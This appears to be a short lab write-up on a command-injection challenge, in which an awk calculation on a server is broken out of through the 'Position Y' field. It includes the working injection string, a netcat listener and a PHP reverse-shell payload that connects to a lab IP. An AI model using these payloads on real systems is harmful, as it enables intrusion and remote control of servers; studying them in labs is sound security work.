#commandInjection  
* We added data in the two boxes, and it reflects in the awk statement what gets executed on the server
* ![[12 - Command Injection - Challenge- vars.png]]
```shell
awk 'BEGIN {print sqrt(((100-1234)^2) + ((200-5678)^2))}'
```
* since we know we want our command to execute AFTER, that data, we will do the command injection in the Position Y box
* After several tests, the input is getting somewhat sanitzed..
* if Y = 5678, we need to make a  terminator to then add data to above awk.
	* 5678)^2))}' ; whoami ; 
		* Failure
	* 5678)^2))}' ; whoami ;#
		* SUCCESS
		* The extra # symbol at the end of the input allowed our  injection to succeed
* Lets try to inject our php directly in here to get shell back
```shell
#start NC listening
nc -nvlp 8888

# Shell code from payloads all the things
php -r '$sock=fsockopen("192.168.176.129",8888);exec("/bin/sh -i <&3 >&3 2>&3");'

#so position Y input box will be 
5678)^2))}'; php -r '$sock=fsockopen("192.168.176.129",8888);exec("/bin/sh -i <&3 >&3 2>&3");' ;#
```

SUCCESS!